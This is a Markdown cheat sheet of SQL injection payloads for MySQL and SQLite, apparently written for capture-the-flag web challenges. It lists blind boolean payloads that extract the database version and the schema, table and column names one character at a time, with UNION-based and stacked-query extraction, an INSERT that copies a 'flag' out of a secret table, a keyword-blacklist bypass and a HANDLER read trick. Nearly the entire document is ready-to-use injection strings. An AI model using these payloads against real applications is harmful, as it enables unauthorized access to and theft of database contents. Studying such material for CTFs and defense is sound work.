## MySQL

### Comment
  - `#`
  - `-- `
  - `/*comment*/`

### Blind SQLi
  - Finding correct payload
      - `admin' and (1=0)#` *return false*
      - `admin' and (1=1)#` *return true*
        
  - Get version [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_version.py)
      - `admin' and (SELECT LENGTH(VERSION())={guess})#`
      - `admin' and (SELECT ASCII(SUBSTRING(VERSION(),1,1))={guess})#`

  - Get schemas [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_get_schemas.py)
      - `admin' and (SELECT COUNT(*)={guess} total_schemas FROM information_schema.SCHEMATA)#`
      - `admin' and (SELECT LENGTH((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {index}))={name_length})#`
      - `admin' and (SELECT ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {schema_index}),{name_index},1))={ord(guess)})#`
  
  - Get tables from schema [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_tables.py)
      - `admin' and (SELECT COUNT(*)={guess} total_schemas FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}')#`
      - `admin' and (SELECT LENGTH((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {index}))={name_length})#`
      - `admin' and (SELECT ASCII(SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {table_index}),{name_index},1))={ord(guess)})#`
   
  - Get columns from table [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_columns.py)
      - `admin' and (SELECT COUNT(*)={guess} total_columns FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}')#`
      - `admin' and (SELECT LENGTH((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}' ORDER BY COLUMN_NAME LIMIT 1 OFFSET {index}))={name_length})#`
      - `admin' and (SELECT ASCII(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}' ORDER BY COLUMN_NAME LIMIT 1 OFFSET {column_index}),{name_index},1))={ord(guess)})#`
   

### Union SQLi
- Extract number column

  - `'union select 1,2,3#`
  - `' order by 3#` 

- Confirming injection visible

  - `'union select @@version,2,3#`

- Extract database names

  - `';show databases;#`
  - `'union select group_concat(0x7c,schema_name,0x7c),2,3 from information_schema.schemata#`

- Extract table neams from database

  - `';show tables;#`
  - `'union select group_concat(0x7c,table_name,0x7c),2,3 from information_schema.tables where table_schema='<DATABASE_NAME>'#`

- Extract column names from table name
  
  ```
  ';show columns from <TABLE_NAME>;#
  ';show columns from `1919810931114514`;# if table name is number it must be queried with backtricks
  'union select group_concat(0x7c,column_name,0x7c),2,3 from information_schema.columns where table_name='<TABLE_NAME>'#
  ```

- Extract data

  - `'union select <COLUMN_NAME>,'b','c' from <DATABASE_NAME>.<TABLE_NAME> where id='1'#`

## SQLite
- Extract previous query
  - `union select sql from sqlite_master`

- Extract table names 
  - `union select name from sqlite_master where type='table'--`
  
- Extract column names from table name
  - `union select sql from sqlite_master where type='table' and name='<table_name>'--`
  
- Extract data using column and table name
  - `union select <column_name> from <table_name> where id=1--`

### Insert
  - `INSERT INTO notes(username, notes) VALUES('admin', (SELECT flag FROM secret LIMIT 0,1)); -- -`


## Tricks

  - Bypass blacklist words
    - `ad'||'min`

  - Read data from column name
    ```
    1'; handler <COLUMN_NAME> open as `a`; handler `a` read next;#
    ```
